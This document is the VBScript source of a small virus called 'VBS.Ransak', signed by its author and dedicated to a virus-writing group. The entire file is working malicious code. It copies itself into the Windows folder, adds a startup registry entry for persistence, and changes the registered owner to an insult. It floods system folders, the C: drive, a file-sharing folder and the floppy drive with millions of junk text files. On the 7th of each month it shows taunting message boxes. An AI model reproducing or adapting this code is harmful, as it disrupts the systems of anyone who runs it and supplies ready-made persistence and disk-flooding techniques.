'VBS.Ransak By DimenZion 1/03
On Error Resume Next
dim fso,reg,x,win,random,filename
set fso=createobject("scripting.filesystemobject")
set reg=createobject("wscript.shell")
set win = fso.getspecialfolder(0)
set x=fso.getfile(wscript.scriptfullname)
x.copy(win&"\rundll32.vbs")
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSrundll32","sysops.vbs"
reg.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","DumbaSS"
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "C:\"
For Count = 1 to 10000000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "Have fun searching and deleting all of these bogus files. They are in more than just this folder. You've been owned!"
CTF.Close
Next
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "C:\windows\system32\"
For Count = 1 to 10000000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "Have fun searching and deleting all of these bogus files. They are in more than just this folder. You've been owned!"
CTF.Close
Next
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "C:\windows"
For Count = 1 to 10000000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "Have fun searching and deleting all of these bogus files. They are in more than just this folder. You've been owned!"
CTF.Close
Next
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "C:\program files\kazaa lite\my shared folder\"
For Count = 1 to 10000000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "Have fun searching and deleting all of these bogus files. They are in more than just this folder. You've been owned!"
CTF.Close
Next
Set FSO = Wscript.CreateObject("Scripting.FileSystemObject")
ThePath = "A:\"
For Count = 1 to 1000
Set CTF = FSO.CreateTextFile(ThePath & Count & ".txt", True)
CTF.Write "Have fun searching and deleting all of these bogus files. They are in more than just this folder. You've been owned!"
CTF.Close
Next
If day(now)=7 then 
Msgbox "This virus is dedicated to the Black Cat Virus Group, you guys rock!"
msgbox "VBS.Ransak by DimenZion...pure annoyance"



